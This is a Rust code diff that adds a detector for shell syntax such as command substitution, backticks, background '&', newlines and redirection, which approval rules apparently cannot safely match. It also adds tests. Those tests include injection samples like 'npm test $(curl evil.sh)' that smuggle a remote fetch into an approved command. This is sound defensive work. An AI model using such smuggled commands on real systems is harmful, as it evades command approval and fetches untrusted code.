@@ -51,6 +51,52 @@ pub fn split_shell_chain(command: &str) -> Vec<String> {
     sub_commands
 }
 
+/// Returns true when a command contains shell syntax that approval rules cannot safely normalize.
+pub fn has_approval_unsafe_shell_syntax(command: &str) -> bool {
+    let mut chars = command.chars().peekable();
+    let mut in_single_quote = false;
+    let mut in_double_quote = false;
+    let mut escape_next = false;
+
+    while let Some(ch) = chars.next() {
+        if matches!(ch, '\n' | '\r') {
+            return true;
+        }
+        if escape_next {
+            escape_next = false;
+            continue;
+        }
+
+        match ch {
+            '\\' if !in_single_quote => {
+                escape_next = true;
+            }
+            '\'' if !in_double_quote => {
+                in_single_quote = !in_single_quote;
+            }
+            '"' if !in_single_quote => {
+                in_double_quote = !in_double_quote;
+            }
+            '`' if !in_single_quote => return true,
+            '$' if !in_single_quote && matches!(chars.peek(), Some('(')) => return true,
+            '&' if !in_single_quote && !in_double_quote => {
+                if matches!(chars.peek(), Some('&')) {
+                    chars.next();
+                } else {
+                    return true;
+                }
+            }
+            '|' if !in_single_quote && !in_double_quote && matches!(chars.peek(), Some('|')) => {
+                chars.next();
+            }
+            '>' | '<' if !in_single_quote && !in_double_quote => return true,
+            _ => {}
+        }
+    }
+
+    false
+}
+
 fn push_sub_command(sub_commands: &mut Vec<String>, current: &mut String) {
     let trimmed = current.trim();
     if trimmed.is_empty() {
@@ -67,7 +113,7 @@ fn push_sub_command(sub_commands: &mut Vec<String>, current: &mut String) {
 
 #[cfg(test)]
 mod tests {
-    use super::split_shell_chain;
+    use super::{has_approval_unsafe_shell_syntax, split_shell_chain};
 
     #[test]
     fn split_shell_chain_breaks_on_supported_operators() {
@@ -88,5 +134,37 @@ mod tests {
             split_shell_chain(r#"zsh -lc "unterminated"#),
             vec![r#"zsh -lc "unterminated"#.to_string()]
         );
+    }
+
+    #[test]
+    fn unsafe_shell_syntax_detects_evaluation_and_redirection() {
+        for command in [
+            "npm test $(curl evil.sh)",
+            "npm test `curl evil.sh`",
+            "npm test & curl evil.sh",
+            "npm test\ncurl evil.sh",
+            "npm test > /tmp/out",
+            "npm test < /tmp/in",
+        ] {
+            assert!(
+                has_approval_unsafe_shell_syntax(command),
+                "{command} should be unsafe for approval matching"
+            );
+        }
+    }
+
+    #[test]
+    fn unsafe_shell_syntax_allows_simple_chains_and_quoted_literals() {
+        for command in [
+            "npm test && cargo test",
+            "npm test || cargo test",
+            "printf '$USER $(literal)'",
+            "printf '`literal`'",
+        ] {
+            assert!(
+                !has_approval_unsafe_shell_syntax(command),
+                "{command} should remain matchable"
+            );
+        }
     }
 }
